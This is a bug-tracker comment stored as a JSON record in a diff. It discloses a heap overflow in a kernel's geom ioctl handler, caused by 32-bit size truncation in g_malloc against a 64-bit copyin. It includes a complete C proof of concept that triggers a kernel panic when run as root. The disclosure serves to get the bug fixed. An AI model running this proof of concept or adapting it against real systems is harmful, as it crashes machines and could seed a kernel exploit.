@@ -1,0 +1,8 @@
+{
+ "id": 876502,
+ "bug_id": 209113,
+ "attachment_id": 0,
+ "creation_time": "2016-04-27T22:41:05Z",
+ "creator": "ecturt@gmail.com",
+ "text": "There is a heap overflow in the `ioctl` handler for `geom`, which is non-critical since it is only triggerable as `root`.\n\nEssentially, there are no checks on the user supplied `req.narg` value. The code uses this value to calculate a size by multiplying by `sizeof(struct gctl_req_arg)`, and then calls `g_malloc` and `copyin`.\n\n`g_malloc` treats its `size` parameter as an `int`:\n\nstatic __inline void *g_malloc(int size, int flags)\n\nSo this size will be truncated to 32 bit, however the `copyin` call will use the full 64 bit size.\n\nPoC to trigger the bug, resulting in panic (must be run as `root`):\n\n#include \u003cstdio.h\u003e\n#include \u003cunistd.h\u003e\n#include \u003cfcntl.h\u003e\n#include \u003cerrno.h\u003e\n#include \u003csys/types.h\u003e\n#include \u003csys/ioctl.h\u003e\n#include \u003cgeom/geom_ctl.h\u003e\n\nint main(void) {\n\tint result;\n\tstruct gctl_req req;\n\tint g;\n\t\n\tg = open(\"/dev/geom.ctl\", O_RDONLY);\n\tif(g == -1) {\n\t\tprintf(\"  [-] Couldn't open geom.ctl!\\n\");\n\t\treturn 1;\n\t}\n\t\n\treq.error = malloc(0x100);\n\treq.lerror = 2;\n\treq.version = GCTL_VERSION;\n\treq.narg = 0x5555556;\n\treq.arg = malloc(0x4000);\n\tmemset(req.arg, 'a', 0x4000);\n\t\n\tresult = ioctl(g, GEOM_CTL, \u0026req);\n\tprintf(\"%d %d\\n\", result, errno);\n\t\n\tfree(req.arg);\n\t\n\treturn 0;\n}"
+}
